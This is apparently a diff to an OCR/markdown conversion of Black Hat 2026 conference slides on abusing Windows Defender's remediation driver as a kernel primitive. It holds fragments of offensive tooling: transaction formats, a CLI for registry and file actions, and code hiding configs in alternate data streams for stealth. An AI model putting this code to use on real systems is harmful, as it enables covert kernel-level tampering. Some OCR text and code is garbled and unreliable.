@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Jiří Vinopal_BTR Reforged Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive .pdf"
 pages: 49
 sha256: "934c667a535231fbae6c44fabe8083aec970d56d8dbb8eeea20b38492e4f878a"
-text_chars: 22246
-ocr_pages: 6
+text_chars: 22122
+ocr_pages: 5
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 88.8
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:10:59Z"
+converted_at: "2026-08-12T05:36:18Z"
 ---
 # BTR Reforged Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive
 
 **Speakers:** Jiří Vinopal  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Jiří Vinopal_BTR Reforged Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive .pdf` (49 pages)
+
 
 ## Slide 1
 
@@ -92,12 +97,11 @@ CONFIG VIA :CHANGELIST ADS **IDA Pseudocode: DriverEntry reads Args from service
 
 ONE-SHOT EXECUTION MODEL
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ONE-SHOT EXECUTION MODEL
-—/
-EXECUTE
 LOAD TRANSACTIONS SELF-UNLOAD CONFIGURATION
 SERVICE_SYSTEM_START (CONFIGURATION) STATUS_DELETE_PENDING The Entire Attack Surface
 During Reboot No IOCTL Interface, No Returns (0xC0000056)
@@ -192,7 +196,8 @@ BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH
 
 ## Slide 15
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Transaction Structure Format
@@ -206,7 +211,6 @@ ee | 0x08 4 PayloadOffset 0x00000010 (Relative offset to Global Payload)
 7 | (0x0 8 TransID (~CRC32(Payload), Size(Payload)).
 Global Payload (Variable)
 Feedback File Path: \??\C:\ProgramData\..\mzqnjtaq.dat
-——
 Operation Item(s)
 Item Header (16 Bytes) ————— — - Item Data (Variable)
 0x00 4 F DataSize is
@@ -246,9 +250,9 @@ USA
 ||`uint32_t TransID_Low;`|`// ~CRC32(Payload)`|
 ||`uint32_t TransID_High;`|`// Size(Payload)`|
 
-```
+\```
 };
-```
+\```
 
 ## Slide 17
 
@@ -292,15 +296,13 @@ The **structure** of the data depends on the **Action ID:**
 
 ###### THE ENTIRE MENU: 6 ACTION IDS  6 KERNEL PRIMITIVES
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 THE ENTIRE MENU:
 S ACTION IDS > 6G KERNEL PRIMITIVES
-Jip
 Action 2: Delete Directory Action 3: Move / Quarantine File
-e.
-fag
 Action 4: Delete Registry Key Action 5: Delete Registry Value Action 6: = Registry Value
 ```
 
@@ -352,7 +354,8 @@ BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH
 
 BTR_CLI HELP SCREEN
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BTR_CLI HELP SCREEN
@@ -409,48 +412,48 @@ Ex: -a 6 -s "HKLM\SOFTWARE\Example" -d "MultiVal" -v "Line1\OLine2" -t 7
 
 • **Mimics MpEngine.dll: Driver file: <random8>.sys Config blob: <random8>.sys:changelist Feedback**  let's **stage it** into **ADS** too **: <random8>.sys:<random8>.dat**
 
-```
+\```
 // Generate random names FIRST (mimics MpEngine.dll behavior)
 std::wstring randomBase =GenerateMangledName();
 std::wstring serviceName =randomBase;
-```
+\```
 
-```
+\```
 // Driver name is now randomized (e.g., mzqnjtaq.sys)
 g_DriverPath =g_BaseDir +randomBase +L".sys";
-```
+\```
 
-```
+\```
 // Config file is now ADS (e.g., mzqnjtaq.sys:changelist)
 g_ConfigFile =g_DriverPath +L":changelist";
-```
+\```
 
-```
+\```
 // Feedback file is now ADS (e.g., mzqnjtaq.sys:mzqnjtaq.dat)
-```
+\```
 
-```
+\```
 std::wstring feedbackFileDos =g_DriverPath +L":"+randomBase +L".dat";
 std::wstring feedbackFileNT =ToNtPath(feedbackFileDos);
-```
+\```
 
 • **Stealth Configuration** ( **ADS** ) **: No visible** configuration files **… BTR_CLI** utilizes **MpEngine-style** Alternate Data Streams ( **ADS** ) **!**
 
-```
+\```
 // Prepare Driver (writes random.sys)
-```
+\```
 
-```
+\```
 if(!PrepareDriver()) return1;
-```
+\```
 
-```
+\```
 // Create Config (writes random.sys:changelist)
-```
+\```
 
-```
+\```
 if(CreateConfigurationFile(feedbackFileNT) &&SetupRegistry(serviceName))
-```
+\```
 
 ## Slide 27
 
@@ -466,18 +469,18 @@ The **more** the **better** ( **used** in **4 places** in the **Transaction** st
 
 - **`ITEM_HEADER::HeaderCRC`**
 
-```
+\```
 uint32_tcrc =initial;
-```
+\```
 
-```
+\```
 constunsignedchar*p =(constunsignedchar*)data;
 for(size_ti =0; i <size; i++) {
-```
+\```
 
-```
+\```
 crc ^=p[i];
-```
+\```
 
 - **`ITEM_HEADER::DataCRC`**
 
@@ -487,21 +490,21 @@ crc ^=p[i];
 
 - No **final XOR /** No **bitwise inversion!**
 
-```
+\```
 for(intj =0; j <8; j++) {
 if(crc &1) crc =(crc >>1) ^0xEDB88320;
 elsecrc >>=1;
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 }
 returncrc;
 }
-```
+\```
 
 **Anyone in the room can reproduce this from memory…**
 
@@ -509,19 +512,19 @@ returncrc;
 
 ###### CONSTRUCT ITEM EXAMPLE: ACTION 6 BUILDER
 
-```
+\```
 std::vector<uint8_t> ConstructItem(uint32_taction, conststd::wstring&source, conststd::wstring&dest, conststd::wstring&
 data, uint32_ttype) {
-```
+\```
 
-```
+\```
 std::vector<uint8_t>itemData;
 std::wstring srcNt =ToNtPath(source);
 std::wstring destNt =ToNtPath(dest);
 std::wstring fullRegPath;
-```
+\```
 
-```
+\```
 switch(action) {
 // ... case 1-5 handling
 case6:// Set Reg Value
@@ -536,15 +539,15 @@ itemData.insert(itemData.end(), finalData.begin(), finalData.end());
 break;
 }
 for(inti =0; i <4; i++) itemData.push_back(0);// 4-byte Padding
-```
+\```
 
-```
+\```
 uint32_titemDataCrc =BtrCrc32(itemData.data(), itemData.size());// BtrCrc32(Item Data)
 BTR_ITEM_HEADER itemHeader ={ (uint32_t)itemData.size(), action, 0, itemDataCrc };// ITEM_HEADER
 itemHeader.HeaderCRC=BtrCrc32(&itemHeader, sizeof(BTR_ITEM_HEADER));// BtrCrc32(ITEM_HEADER)
 // ... put itemBlob together –finalize ITEM_HEADER + Item Data
 returnitemBlob;}
-```
+\```
 
 ## Slide 29
 
@@ -646,21 +649,14 @@ PROCMON BOOT TIMELINE Live boot capture on **Win 11 25H2**  every step **prov
 
 BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-a
-a arte sae: --* ; ¢ if 7 black hat
-BTR REFORGED | JIRI VINOPAL |. CHECK POINT RESEARCH : A ©2846
-```
-
 ## Slide 39
 
 ## Slide 40
 
 THE THREE COMMANDS
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 THE THREE COMMANDS
